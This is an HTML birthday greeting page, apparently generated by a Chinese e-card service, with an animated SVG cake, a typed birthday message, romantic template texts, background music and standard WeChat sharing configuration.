<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<title>生日快乐</title>

    <script>
        //判断客户端设备，选择写入meta
        function init_viewport(){
            if(navigator.userAgent.indexOf('Android') != -1){
                var version = parseFloat(RegExp.$1);
                if(version>2.3){
                    var width = window.outerWidth == 0 ? window.screen.width : window.outerWidth;
                    var phoneScale = parseInt(width)/500;
                    document.write('<meta name="viewport" content="width=500, minimum-scale = '+ phoneScale +', maximum-scale = '+ phoneScale +', target-densitydpi=device-dpi">');
                }else{
                    document.write('<meta name="viewport" content="width=500, target-densitydpi=device-dpi, user-scalable=0">');
                }
            }else if(navigator.userAgent.indexOf('iPhone') != -1){
                var phoneScale = parseInt(window.screen.width)/500;
                document.write('<meta name="viewport" content="width=500, min-height=750, initial-scale=' + phoneScale +', maximum-scale='+phoneScale+', user-scalable=0" /> ');         //0.75   0.82
            }else{
                document.write('<meta name="viewport" content="width=500, height=750, initial-scale=0.64" /> '); //0.75  0.82
            }
        }
        init_viewport();
    </script> 

	<style>
		* {
            padding: 0px;
            margin: 0px;
            -webkit-box-sizing: border-box;
        } 
        body {
            background-color: white;
        }
        a {
            color: white;
            text-decoration: none; 
        }

        #div_container { /*最外层div，用于居中兼容PC和移动*/
            width: 500px;
            margin: 0px auto; 
            position: relative; 
            /*background-color: #FAFAFA;*/
            font-size: 1em;
        }


        .div_pure_words { /*文字部分的最外层，用于定位*/
            position: relative;
            display: none;
        }
        .div_pure_words_bg { /*背景设置在这里*/
            background-repeat: repeat; 
            background-size: 100%; 
            background-attachment: fixed; 
            width: 500px;
            min-height: 500px; 
        }
        .div_pure_words_height {
            visibility: hidden;
            padding: 30px; 
            text-align: justify;  /*为了使文字两端对齐 */
            white-space: pre-wrap; /*保留换行效果*/
            font-size: 1.1em;
            font-family: "Microsoft YaHei","Arial";
            color: white; 
        }
        .div_pw_typed {
            position: absolute;
            left: 0;
            right: 0;  /*4个方向定位使div充满整个画画*/
            top: 0;
            bottom: 0;  /*4个方向定位使div充满整个画画*/
            width: 500px;            
            background:rgba(255,255,255,0.8); /*半透明效果*/
            padding: 30px; 
            text-align: justify;  /*为了使文字两端对齐 */
        } 
        #span_pw_typed {
            width:100%; /*为了使文字两端对齐 */ 
            white-space:pre-wrap; /*保留换行效果*/ 
            font-size: 1.1em;
            font-family: "Microsoft YaHei","Arial";
        }


        #div_start_bg{
            width: 100%; height: 100%;
            position: absolute;
            left: 0px; top: 0px;
            z-index: 44;
            background-color: white;
        }
	</style>

    <!-- 按钮部分的样式 -->
    <link type="text/css" rel="stylesheet" href="../../m/m3/css/theme_public_btn.css">


        

        

     

    <!-- 按需加载，选择此片头时方才加载 -->
        <link type="text/css" rel="stylesheet" href="../../m/m3/css/start_birthdaycake.css"> 

      

     

     
</head>

<body>
    <div id="div_container"> <!-- 最外层div，用于居中兼容PC和移动 --> 
        <div id="div_start_bg"></div> <!-- 用于遮挡主题，作为片头的背景 -->

                

        <!-- 按需加载，选择此片头时方才加载 -->



        


        <!-- 按需加载，选择此片头时方才加载 -->
            <div id="div_dbcake"><!-- 用于设置背景 -->
                <div id="div_dbcake_inner"><!-- 用于存放文字div -->  
                    <div id="div_dbacke_access">
                        <h1>生日快乐</h1>
                        <input id="input_award" type="text" autofocus="autofocus" autofocus="autofocus" placeholder="123" oninput="show_dbcake_btn()" maxlength="10">
                        <input id="input_award_btn" type="button" value="点这里打开惊喜" onclick="show_dbcake()">
                    </div> 

                    <div id="div_dbcake_cake">
                        <div class="velas">
                            <div class="fuego"></div>
                            <div class="fuego"></div>
                            <div class="fuego"></div>
                            <div class="fuego"></div>
                            <div class="fuego"></div>
                        </div>

                        <svg id="svg_dbcake" version="1.1" x="0px" y="0px" width="200px" height="500px" viewBox="0 0 200 500" enable-background="images/d432686891e9406cb950f017f33b2aee.gif" xml:space="preserve">
                            <path fill="#a88679" d="M173.667-13.94c-49.298,0-102.782,0-147.334,0c-3.999,0-4-16.002,0-16.002
                                c44.697,0,96.586,0,147.334,0C177.667-29.942,177.668-13.94,173.667-13.94z">
                                <animate id="bizcocho_3" attributeName="d" calcMode="spline" keySplines="0 0 1 1; 0 0 1 1" begin="relleno_2.end" dur="0.3s" fill="freeze" values="
                                                  M173.667-13.94c-49.298,0-102.782,0-147.334,0c-3.999,0-4-16.002,0-16.002
                                c44.697,0,96.586,0,147.334,0C177.667-29.942,177.668-13.94,173.667-13.94z
                                                  ;
                                                  M173.667,411.567c-47.995,12.408-102.955,12.561-147.334,0
                                c-3.848-1.089-0.189-16.089,3.661-15.002c44.836,12.66,90.519,12.753,139.427,0.07
                                C173.293,395.631,177.541,410.566,173.667,411.567z
                                                  ;
                                                  M173.667,427.569c-49.795,0-101.101,0-147.334,0c-3.999,0-4-16.002,0-16.002
                                c46.385,0,97.539,0,147.334,0C177.668,411.567,177.667,427.569,173.667,427.569z
                                                  " />
                            </path>
                            <path fill="#8b6a60" d="M100-178.521c1.858,0,3.364,1.506,3.364,3.363c0,0,0,33.17,0,44.227
                                c0,19.144,0,57.431,0,76.574c0,10.152,0,40.607,0,40.607c0,1.858-1.506,3.364-3.364,3.364l0,0c-1.858,0-3.364-1.506-3.364-3.364c0,0,0-30.455,0-40.607c0-19.144,0-57.432,0-76.575c0-11.057,0-44.226,0-44.226C96.636-177.015,98.142-178.521,100-178.521
                                L100-178.521z">
                                <animate id="relleno_2" attributeName="d" calcMode="spline" keySplines="0 0 1 1; 0 0 1 1; 0 0 0.58 1" begin="bizcocho_2.end" dur="0.5s" fill="freeze" values="
                                                  M100-178.521c1.858,0,3.364,1.506,3.364,3.363c0,0,0,33.17,0,44.227
                                c0,19.144,0,57.431,0,76.574c0,10.152,0,40.607,0,40.607c0,1.858-1.506,3.364-3.364,3.364l0,0c-1.858,0-3.364-1.506-3.364-3.364c0,0,0-30.455,0-40.607c0-19.144,0-57.432,0-76.575c0-11.057,0-44.226,0-44.226C96.636-177.015,98.142-178.521,100-178.521
                                L100-178.521z
                                                  ;
                                                  M100,267.257c1.858,0,3.364,1.506,3.364,3.363c0,0,0,33.17,0,44.227
                                c0,19.143,0,57.43,0,76.574c0,10.151,0,40.606,0,40.606c0,1.858-1.506,3.364-3.364,3.364l0,0c-1.858,0-3.364-1.506-3.364-3.364
                                c0,0,0-30.455,0-40.606c0-19.145,0-57.432,0-76.576c0-11.057,0-44.225,0-44.225C96.636,268.763,98.142,267.257,100,267.257
                                L100,267.257z
                                                  ;
                                                  M93.928,405.433c-0.655,6.444-0.102,9.067,2.957,11.798c0,0,8.083,5.571,16.828,3.503
                                c18.629-4.406,43.813,6.194,50.792,7.791c14.75,3.375,9.162,6.867,9.162,6.867c-2.412,2.258-58.328,0-73.667,0l0,0
                                c-1.858,0-69.995,2.133-73.667,0c0,0-3.337-2.439,6.172-5.992c11.375-4.25,52.875,8.822,47.139-9.442
                                c-6.333-20.167,5.226-21.514,5.226-21.514c3.435-0.915,12.78-6.663,10.923-0.546L93.928,405.433z
                                                  ;
                                                  M102.242,427.569c5.348,0,14.079,0,17.462,0c0,0,17.026,0,27.504,0
                                c19.143,0,20.39-3.797,26.459,0c3,1.877,0,7.823,0,7.823c-2.412,2.258-58.328,0-73.667,0l0,0c-1.858,0-67.187,0-73.667,0
                                c0,0-4.125-4.983,0-7.823c5.201-3.58,16.085,0,23.725,0c8.841,0,20.762,0,20.762,0c3.686,0,8.597,0,19.511,0H102.242z
                                                  " />
                            </path>
                            <path fill="#a88679" d="M173.667-15.929c-46.512,0-105.486,0-147.334,0c-3.999,0-4-16.002,0-16.002
                                c43.566,0,97.96,0,147.334,0C177.667-31.931,177.666-15.929,173.667-15.929z">
                                <animate id="bizcocho_2" attributeName="d" calcMode="spline" keySplines="0 0 1 1; 0 0 1 1; 0.25 0 0.58 1" begin="relleno_1.end" dur="0.5s" fill="freeze" values="
                                                  M173.667-15.929c-46.512,0-105.486,0-147.334,0c-3.999,0-4-16.002,0-16.002
                                c43.566,0,97.96,0,147.334,0C177.667-31.931,177.666-15.929,173.667-15.929z
                                                  ;
                                                  M173.434,445.393c-47.269,8.001-105.245,8.001-147.334,0c-3.929-0.747-0.692-16.543,3.243-15.824
                                c43.828,8.001,92.165,8.001,140.739,0C174.029,428.918,177.377,444.726,173.434,445.393z
                                                  ;
                                                  M173.667,449.514c-47.576-5.454-102.799-5.744-147.333,0c-3.966,0.512-3.938-15.297,0-16.002
                                c43.683-7.823,97.646-8.026,147.333,0C177.616,434.15,177.642,449.969,173.667,449.514z
                                                  ;
                                                  M173.667,451.394c-49.298,0-102.782,0-147.334,0c-3.999,0-4-16.002,0-16.002
                                c44.697,0,96.586,0,147.334,0C177.667,435.392,177.668,451.394,173.667,451.394z
                                                  " />
                            </path>
                            <path fill="#8b6a60" d="M101.368-73.685c0,12.164,0,15.18,0,28.519c0,22.702,0-13.661,0,8.304c0,14.48,0,18.233,0,30.512
                                c0,1.753-2.958,1.847-2.958,0c0-12.68,0-16.277,0-30.401c0-21.983,0,11.66,0-8.305c0-13.027,0-15.992,0-28.628
                                C98.411-75.883,101.368-75.592,101.368-73.685z">
                                <animate id="relleno_1" attributeName="d" calcMode="spline" keySplines="0 0 1 1; 0 0 1 1; 0 0 0.6 1" begin="bizcocho_1.end" dur="0.5s" fill="freeze" values="
                                                  M101.368-73.685c0,12.164,0,15.18,0,28.519c0,22.702,0-13.661,0,8.304c0,14.48,0,18.233,0,30.512
                                c0,1.753-2.958,1.847-2.958,0c0-12.68,0-16.277,0-30.401c0-21.983,0,11.66,0-8.305c0-13.027,0-15.992,0-28.628
                                C98.411-75.883,101.368-75.592,101.368-73.685z
                                                  ;
                                                  M101.368,350.885c0,12.164,0,65.18,0,78.518c0,22.703,0-33.66,0-11.695c0,14.48,0,28.232,0,40.512
                                c0,1.753-2.958,1.847-2.958,0c0-12.68,0-26.277,0-40.402c0-21.982,0,31.66,0,11.695c0-13.027,0-65.992,0-78.627
                                C98.411,348.686,101.368,348.977,101.368,350.885z
                                                  ;
                                                  M128.38,447.567c37.626,6.312,39.303,13.658,26.833,12.833c-22.653-1.499-13.636-0.831-23.302-0.831
                                c-14.48,0-17.884,0-30.163,0c-2.087,0-2.068,0-3.915,0c-13.333,0-8.963,0-23.088,0c-11.668,0-14.062,5.995-27.532,1.164
                                c-12.629-4.529,38.667-3.167,46.833-17.333C100.077,432.94,105.546,443.736,128.38,447.567z
                                                  ;
                                                  M173.667,451.394c2.875,0,2.997,9.257,0,9.131c-22.662-0.956-32.09-0.956-41.756-0.956
                                c-14.48,0-17.884,0-30.163,0c-2.087,0-2.068,0-3.915,0c-13.333,0-8.963,0-23.088,0c-11.668,0-34.99-0.294-48.412,1.831
                                c-4.109,0.65-3.01-10.006,0-10.006C37.129,451.394,149.379,451.394,173.667,451.394z
                                                  " />
                            </path>
                            <path fill="#a88679" d="M173.667,21.571c-33.174,0-111.467,0-147.334,0c-4,0-4-16.002,0-16.002c39.836,0,105.982,0,147.334,0
                                C177.668,5.569,177.667,21.571,173.667,21.571z">
                                <animate id="bizcocho_1" attributeName="d" calcMode="spline" keySplines="0 0 1 1; 0 0 1 1; 0 0 1 1; 0.25 0 1 1; 0 0 1 1; 0.25 0 0.6 1" begin="indefinite" dur="0.8s" fill="freeze" values="
                                                  M173.667,21.571c-33.174,0-111.467,0-147.334,0c-4,0-4-16.002,0-16.002c39.836,0,105.982,0,147.334,0
                                C177.668,5.569,177.667,21.571,173.667,21.571z
                                                  ;
                                                  M173.667,459.569c-33.197,16.002-110.782,16.002-147.334,0c-3.664-1.604,1.614-15.617,5.337-14.153
                                c40.702,16.002,94.289,16.104,136.505,0.103C171.917,444.1,177.271,457.832,173.667,459.569z
                                                  ;
                                                  M171.817,475.571c-39.361-3.001-105.438-2.571-143.556,0c-3.991,0.27-7.377-14.736-3.387-15.014
                                c41.553-2.888,104.421-3.121,150.51-0.233C179.378,460.574,175.806,475.875,171.817,475.571z
                                                  ;
                                                  M171.817,459.564c-38.8-12.188-104.504-13.762-143.556,0c-3.772,1.329-7.961-12.604-4.178-13.905
                                c40.864-14.064,105.114-15.52,151.918-0.973C179.822,445.874,175.634,460.762,171.817,459.564z
                                                  ;
                                                  M173.667,475.571c-46.376-5.005-105.924-4.003-147.334,0c-3.981,0.385-3.479-15.421,0.479-16.002
                                c43.087-6.327,97.705-7.083,146.855,0.438C177.621,460.613,177.644,476,173.667,475.571z
                                                  ;
                                                  M173.667,474.117c-46.376,1.866-105.638,2.01-147.334,0c-3.995-0.192-3.52-16.144,0.479-16.002
                                c43.794,1.55,96.341,1.541,145.723,0C176.532,457.99,177.663,473.956,173.667,474.117z
                                                  ;
                                                  M173.667,475.571c-46.512,0-105.486,0-147.334,0c-3.999,0-4-16.002,0-16.002c43.566,0,97.96,0,147.334,0
                                C177.667,459.569,177.666,475.571,173.667,475.571z
                                                  " />
                            </path>
                            <path fill="#fefae9" d="M104.812,113.216c0,3.119-2.164,5.67-4.812,5.67c-2.646,0-4.812-2.551-4.812-5.67c0-5.594,0-16.782,0-22.375
                            c0-5.143,0-15.427,0-20.568c0-7.333,0-21.998,0-29.33c0-5.523,0-16.569,0-22.092c0-3.295,0-9.885,0-13.181
                            C95.188,2.551,97.353,0,100,0c2.648,0,4.812,2.551,4.812,5.669c0,3.248,0,9.743,0,12.991c0,5.428,0,16.284,0,21.711
                            c0,7.618,0,22.854,0,30.472c0,4.952,0,14.854,0,19.807C104.812,96.292,104.812,107.576,104.812,113.216z">
                                <animate id="crema" attributeName="d" calcMode="spline" keySplines="0 0 1 1; 0 0 1 1; 0 0 1 1; 0.25 0 1 1; 0 0 1 1; 0 0 0.58 1" begin="bizcocho_3.end" dur="2s" fill="freeze" values="
                                                  M104.812,113.216c0,3.119-2.164,5.67-4.812,5.67c-2.646,0-4.812-2.551-4.812-5.67c0-5.594,0-16.782,0-22.375
                            c0-5.143,0-15.427,0-20.568c0-7.333,0-21.998,0-29.33c0-5.523,0-16.569,0-22.092c0-3.295,0-9.885,0-13.181
                            C95.188,2.551,97.353,0,100,0c2.648,0,4.812,2.551,4.812,5.669c0,3.248,0,9.743,0,12.991c0,5.428,0,16.284,0,21.711
                            c0,7.618,0,22.854,0,30.472c0,4.952,0,14.854,0,19.807C104.812,96.292,104.812,107.576,104.812,113.216z
                                                  ;
                                                  M104.812,405.897c0,3.119-2.164,5.67-4.812,5.67c-2.646,0-4.812-2.551-4.812-5.67c0-5.594,0-16.782,0-22.376
                            c0-5.143,0-15.426,0-20.568c0-7.332,0-21.997,0-29.33c0-5.522,0-16.568,0-22.092c0-3.295,0-9.885,0-13.181
                            c0-3.118,2.165-5.669,4.812-5.669c2.648,0,4.812,2.551,4.812,5.669c0,3.247,0,9.743,0,12.991c0,5.428,0,16.283,0,21.711
                            c0,7.618,0,22.854,0,30.473c0,4.951,0,14.854,0,19.807C104.812,388.972,104.812,400.256,104.812,405.897z
                                                  ;
                                                  M111.873,411.567c-3.119,0-9.226,0-11.874,0c-2.646,0-7.748,0-10.867,0c-7.086,0-12.698,0-18.292,0
                            c-6.592,0-12.871,7.371-19.166,3.008c-10.043-6.961-7.776-10.169,2.991-17.745c12.61-8.873,27.713,1.994,25.919-7.531
                            c-2.589-13.742,11.008-14.513,11.365-17.789c0.441-4.051,4.235-11.107,8.051-8.175c3.113,2.393,1.007,8.008,0,13.159
                            c-1.871,9.569,8.058,2.113,9.494,14.155c2.592,21.732,21.184-0.675,29.309,7.976c5.216,5.553,18.413,5.552,15.426,12.942
                            c-3.131,7.745-15.825-4.369-23.8,2.903C126.261,418.271,118.301,411.567,111.873,411.567z
                                                  ;
                                                  M111.873,411.567c-3.119,0-9.226,0-11.874,0c-2.646,0-9.734,4.069-12.853,4.069
                            c-7.086,0-10.712-4.069-16.306-4.069c-6.592,0-12.12,6.013-19.166,3.008c-7.053-3.008-7.458,2.026-18.659,1.165
                            c-6.832-0.525-7.522-3.034-7.533-6.265c-0.037-10.336,22.073-2.452,36.613-2.628c10.234-0.124,19.856-1.439,37.905-2.102
                            c16.642-0.61,32.699,1.552,46.009,1.927c12.438,0.351,29.663-8.99,31.532,3.315c0.773,5.093-5.605,3.342-11.211,9.579
                            c-5.093,5.667-7.59-4.605-12.965-3.832c-8.269,1.189-14.962-8.537-22.937-1.265C126.261,418.271,118.301,411.567,111.873,411.567z
                                                  ;
                                                  M110.946,413.652c-2.904-1.137-8.405-2.748-12.446-0.97c-6.099,2.685-7.273,10.358-13.253,8.242
                            c-7.843-2.775-8.953-5.008-14.546-5.01c-24.653-0.011-4.849,26.507-18.264,26.507c-12.377,0,5.791-33.537-19.422-26.682
                            c-7.703,2.095-9.806-0.942-9.817-4.173c-0.037-10.336,24.357-4.544,38.897-4.72c10.234-0.124,19.856-1.439,37.905-2.102
                            c16.642-0.61,32.699,1.552,46.009,1.927c12.438,0.351,28.973-8.865,31.532,3.315c1.449,6.896,0.318,15.624-3.874,15.624
                            c-7.619,0-1.788-15.192-19.243-7.111c-7.581,3.51-15.963-9.738-26.669,1.066C120.644,426.744,118.381,416.561,110.946,413.652z
                                                  ;
                                                  M111.547,413.9c-2.969-0.956-8.775-0.949-13.167-0.5c-14.667,1.5-8.325,16.508-14.667,16.666
                            c-6.667,0.166-0.167-13.5-13.013-14.151c-30.471-1.545-5.572,46.651-18.987,46.651c-12.377,0,10.333-50.166-18.667-44.5
                            c-7.835,1.531-9.537-1.417-9.548-4.647c-0.037-10.336,23.675-5.177,38.215-5.353c10.234-0.124,20.618-1.671,38.667-2.333
                            c16.642-0.61,32.023,1.458,45.333,1.833c12.438,0.351,33.819-8.431,33.199,4.001c-0.532,10.666,0.414,26.166-5.245,25.833
                            c-7.606-0.447-2.954-31.5-19.243-18.899c-7.985,6.177-17.658-5.969-27.377,5.732C118.88,434.066,121.38,417.067,111.547,413.9z
                                                  ;
                                                  M111.547,415.233c-6.667-0.834-9.667,4.667-13.833,3.333c-19.649-6.291-8.158,22.176-14.5,22.334
                            c-6.667,0.166,2.833-18-13.333-22.167c-29.544-7.615-9.667,43.833-20.167,43.833c-10.333,0,8.004-55.006-16.833-39
                            c-7.5,4.833-9.508-3.78-9.299-7.004c0.799-12.329,23.592-7.153,38.132-7.329c10.234-0.124,20.238-1.505,38.287-2.167
                            c16.642-0.61,32.903,1.125,46.213,1.5c12.438,0.351,35.058-5.579,31.863,6.451c-5.532,20.833,1.25,28.216-4.409,27.883
                            c-7.606-0.447-6.058-37.895-20.62-23.333c-10.167,10.166-15.972-0.747-25,12C119.547,443.568,121.798,416.515,111.547,415.233z
                                                  " />
                            </path>
                            <rect x="10" y="475.571" fill="#fefae9" width="180" height="4" />
                        </svg>  
                    </div>

                    <div id="div_dbcake_wish">
                        <div class="div_dbcake_text">
                            <h1>happy birthday!</h1>
                            <p>送给可爱的小仙女，送你天天开心，越来越漂亮哦，要准时吃饭哦，多喝热水哈。送给可爱的小仙女，送你天天开心，越来越漂亮哦，要准时吃饭哦，多喝热水哈。多喝热水哈。。。</p>
                        </div> 
                        <ul>
                            <li onclick="dbcake_go_next()">我喜欢</li>
                            <li onclick="dbcake_show_note()">不喜欢</li>
                        </ul>
                        <div id="div_wish_note" onclick="dbcake_hide_note()">
                            <img src="../../images/emoji_wulian.jpg" alt=""><br>
                            不能不喜欢，哈哈 
                            <div id="div_wish_note_close">✖</div>
                        </div>
                    </div>
                </div>
            </div>  



        


                
  
        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->
        <!-- 以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头  以上是动画和视频片头 -->






        <div class="div_pure_words"> <!-- 文字部分的最外层，用于定位 -->
            <div class="div_pure_words_bg"><!-- 背景设置在这里 -->
                <div class="div_pure_words_height"> 
                    <!-- 正文的内容复制到这里面，撑开整个文档的高度 -->
                </div>
            </div> 
            <div class="div_pw_typed"> <!-- 正文部分，绝对定位 --> 
                <span id="span_pw_typed"></span>
            </div> 
        </div>





        


        
        <div id='div_btn_container'> <!-- 按钮部分的最外层，处于文档流之中 -->
            <div id="div_btn_inner"> <!-- 按钮部分内层，用于定位 -->

                <div class='div_music_tips'></div>
                <div class="div_btn" id="div_music" onclick="music_switch()"> <!-- 音乐按钮部分 -->
                    <img id='img_music' src='http://1.1022reba.com/images/music_note_big.png' style='-webkit-animation:music_play_rotate 1s linear infinite'>
                    <audio id="audio_music" autoplay="autoplay" loop="loop">
                        <source type="audio/mpeg"/>  
                        <!-- 您的浏览器不支持播放音乐 -->
                    </audio>
                </div>

                <div class='div_record_tips'></div>
                <div class="div_btnjavascript:;" id="div_record" onclick="record_switch()"> <!-- 录音按钮部分 -->
                    语音
                    <audio id="audio_record" loop="loop">
                        <source type="audio/mpeg"/>  
                        <!-- 您的浏览器不支持播放音乐 -->
                    </audio>
                </div>
                
                <!-- 只在提交状态显示 只在提交状态显示 只在提交状态显示 只在提交状态显示 -->
	<div class="div_btn" id='div_record'>
                        <a href="https://mp.weixin.qq.com/s/SOvjwhYJN7YJXF3mV5t4vA"><span>更多</span></a>
                    </div> 


            
                <!-- 只在提交状态显示 只在提交状态显示 只在提交状态显示 只在提交状态显示 -->

                <!-- 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 -->
                  
                <!-- 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 只在未提交状态显示 -->
            </div> 
        </div>
    </div>







    <script src="../../m/m3/js/jquery-2.0.3.min.js"></script>
    <script src="../../m/m3/js/typed.min.js"></script>
    <script src="../../m/m3/js/support_upload_as.js"></script>
    <script src="../../m/m3/js/jweixin-1.2.0.js"></script>
    <script>
        var window_height=$(window).height();
        console.log('window_height ->'+window_height);

        var theme='pure_words';
        console.log('theme ->'+theme);
        var theme_content={"pure_words_content":"🤫🤫  \r  \r今天是你的生日🎂，\r \r愿所有的幸福都围绕着你🤫，\r \r左边是甜蜜❤️，\r \r右边是满足😋；\r \r愿所有的如意都围绕着你😊，\r \r前边是平安🍎，\r \r后面是健康💪；\r \r祝你生日快乐😬！","typed_bool":"typed_y","cursor_char":"cursor_heart","bg_style_pure_words":"bg_opacity","bg_img":"https://img13.360buyimg.com/ddimg/jfs/t1/180591/21/17125/102718/6106170aEb2b55329/294f3daedf0a7fc1.jpg","simple_page_content":"&lt;p&gt;&lt;br&gt;&lt;\/p&gt;","video_page_content":"","bg_style":"bg_simple"};
        console.log(theme_content);

        var music_json={"music_select":"m_online","m_online_id":"6","m_online_url":"https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/1624146213409795.mp3","m_upload_name":"null","m_upload_url":"null"};
        console.log(music_json);
        var record_json={"record_bool":"r_false","r_wechat_time":"null","r_wechat_url":"null","r_wechat_amr":"null"};
        console.log(record_json);
        var signPackage={"appid":"wx47f716bdd7699533","timestamp":1578227319,"nonceStr":"8LPWxGxKiX51ZiiT","url":"http:\/\/www.makusi.cn\/Home\/Play\/play_show\/ws\/YGdml21m","signature":"77c51cd322dc4c46953ed6c717b520fecd9517a8","rawString":"jsapi_ticket=sM4AOVdWfPE4DxkXGEs8VHINcjHJVwMsFjJyfreRy7BkPikCF23E_PJXM0R1f3A60Yj9luL42XotYVYjMd4eZg&noncestr=8LPWxGxKiX51ZiiT&timestamp=1578227319&url=http:\/\/www.makusi.cn\/Home\/Play\/play_show\/ws\/YGdml21m"};

        var main_title='生日快乐';
        // console.log(main_title);
        if(main_title=='' || main_title=='null'){  //允许标题为空
            document.title='慢慢喜欢你';
        } 
        // console.log(""); 


        var pure_words_content=theme_content['pure_words_content'];
        var str_cursorChar; 
        var typed_bool;

        var interval_pw_height;
        var height_div_pw=$(".div_pure_words_height").height();
        function init_pure_words(){
            //允许内容为空时直接展示，不设置为随机内容，用于空主题
            if(typeof(pure_words_content)=='undefined'){ //处理全新作品
                var array_str_temp=[];
                random_text_array(array_str_temp,12); //获取随机的模板文字
                // array_str_temp.push('你现在看到的只是案例，文字是可以自定义哒，6000字以下');
                pure_words_content=array_str_temp.join('\r\r');
            }
            $(".div_pure_words_height").html(pure_words_content+'22222');  //初始化复制内容，撑开文档高度            
            
            // 初始化设置div的bg图片 初始化设置div的bg图片
            if(typeof(theme_content['bg_style_pure_words'])!='undefined' && theme_content['bg_style_pure_words']=='bg_opacity'){
                if(typeof(theme_content['bg_img'])!='undefined' && theme_content['bg_img']!=''){                    
                    $(".div_pure_words_bg").css({"background-image": "url("+theme_content['bg_img']+")"});
                }
            } 

            //以下是打字效果的js 
            if(typeof(theme_content['cursor_char'])!='undefined' && theme_content['cursor_char']!=''){
                switch(theme_content['cursor_char']){ //设置打字光标的样式
                    case 'cursor_heart':
                        str_cursorChar='❤';
                        break;
                    case 'cursor_sub':
                        str_cursorChar='_';
                        break;
                    case 'cursor_music':
                        str_cursorChar='♫';
                        break;
                    case 'cursor_star':
                        str_cursorChar='★';
                        break;
                    case 'cursor_sun':
                        str_cursorChar='☀';
                        break;
                    default:
                        str_cursorChar='|';
                }
            }else{ //处理全新作品，默认显示打字效果
                str_cursorChar='❤';
            }
            
            //判断用户有没有选择打字效果
            if(typeof(theme_content['typed_bool'])!='undefined' && theme_content['typed_bool']!=''){
                typed_bool= theme_content['typed_bool']=='typed_y' ? true : false;                  
            }else{
                typed_bool=false; //默认显示打字效果
            } 
            // console.log(typed_bool);
        
            display_pure_words(); 
            $(".div_pure_words").fadeIn();
            
            interval_pw_height=setInterval(function(){
                console.log('div_pure_words_height -> '+$('.div_pure_words_height').height());
                var least_height_div_pw=$('.div_pure_words_height').height();
                if(least_height_div_pw>height_div_pw){
                    height_div_pw=least_height_div_pw;
                }else{
                    clearInterval(interval_pw_height);
                    $(".div_pure_words_height").height(least_height_div_pw+100);
                    if($(".div_pure_words_height").height()<window_height){
                        $(".div_pure_words_height").height(window_height); //不能小于窗口的高度
                        console.log('let us be high as window');
                    } 
                }
            },100);
        }

        
        function display_pure_words(){
            if(typed_bool){ 
                var typed_pure_words = new Typed('#span_pw_typed', {
                    strings: [pure_words_content], //输入内容, 支持html标签
                    typeSpeed: 120, //打字速度
                    cursorChar: str_cursorChar,//替换光标的样式
                    contentType: 'html', //值为html时，将打印的文本标签直接解析html标签
                    onComplete: function(abc){
                                // console.log(abc); 
                                console.log('finished typing words'); 
                                // console.log($('#span_pw_typed').height()-$(".div_pure_words_height").height());
                            },
                });
            }else{
                //如果不需要打字效果就直接显示
                $("#span_pw_typed").html(pure_words_content).fadeIn(); 
            }
            init_attachment();
        } 


        function random_text_array(temp_array,length){  //获取随机的模板文字
            console.log('random_text_array');
            var random_array=[];
            while(random_array.length<length){
                // var random_num=Math.floor(Math.random()*(array_as_pics.length-0))+0;
                var random_num=Math.floor(Math.random()*(array_as_words_love.length)); //随机取值 
                if(random_array.indexOf(random_num)==-1){
                    random_array.push(random_num);
                }
            }
            // console.log(random_array);
            for(var i=0; i<length; i++){  
                temp_array.push(array_as_words_love[random_array[i]]); //获取随机的模板文字
            }
        }         
        
    </script>







        

     <!-- 按需加载，选择此片头时方才加载 -->
    

    <script> 
        var start_content={"hearttree_text":"小生不才\r\n仰慕姑娘已久\r\n敢问姑娘心系谁家？\r\n倘若姑娘不弃\r\n小生愿扶姑娘上那花轿\r\n入我家门\r\n余生携姑娘看那朝阳起\r\n坐暮落\r\n看那雁南飞，月下酒对饮\r\n岂不快哉？😂😂 _","hearttree_desc":"❤️❤️","hearttree_time":"2019-12-18","hearttree_time_type":"hearttree_postive","bg_img":"https://img13.360buyimg.com/ddimg/jfs/t1/180591/21/17125/102718/6106170aEb2b55329/294f3daedf0a7fc1.jpg","img_src":"123.jpg","intersect_text":"我知道遇见你不容易，错过会很可惜，余生都是回忆，  我想余生每天都是你，我爱你","cursor_char":"cursor_heart","bg_style":"bg_custom","img_bool":"img_true","courage_h1":"","courage_h2":"","courage_receiver":"","courage_text":["最美丽的事，莫过于在最好的时光遇见你，相互嫌弃，却又不离不弃","不是因为想恋爱才遇见你，而是遇见你之后我才有了恋爱的想法","我知道遇见你不容易，错过会很可惜，我不希望余生都是回忆，我想余生每天都是你，我爱你"],"chase_title":"你知道1杠10的表白含义吗？","chase_text":"答案很长，我准备用一生的时间 回答你，你准备要听了吗？","chase_benefit":["一个情缘认识你","两次见面留意你","三番四次约会你，","五天不见想念你","六神无主爱上你","七上八下告诉你","九分应该喜欢你","十分肯定我爱你","请点 Yes🥺","请点Yes"],
	"dbcake_question":"生日快乐哟！答案是～好的","dbcake_answer":"好的","dbcake_title":"","dbcake_wishes":"又长大一岁啦，祝你开心快乐每一天，运气爆表，活出自己想要的样子"}; //可能为null
        console.log(start_content); 

        var start_id;
        $(function(){
            //此事件为触发互动创意
            start_id='birthdaycake'; //可能为null
            init_start(start_id);
        });
        
        function init_start(start_id){ 
            console.log('init_start ->'+start_id);
            switch(start_id){
                case 'loveformat':
                    $('.div_loveformat').show();
                    init_loveformat();
                    break;
                case 'hearttree':
                    $('#div_hearttree').show();
                    init_hearttree();
                    break;
                case 'courage':
                    $('#div_courage').show();
                    init_courage();
                    break;
                case 'birthdaycake':
                    $('#div_dbcake').show();
                    init_birthdaycake();
                    break;
                case 'intersect':
                    $('#div_intersect').show();
                    init_intersect();
                    break;
                case 'onlyyou':
                    $('#div_onlyyou').show();
                    init_onlyyou();
                    break;
                default:
                    init_theme(); 
            }
        } 

        //开始动画主体部分
        function init_theme(){
            console.log('init_theme');
            $('#div_start_bg').fadeOut();
            init_pure_words();            
        }

    </script>




    

        

    

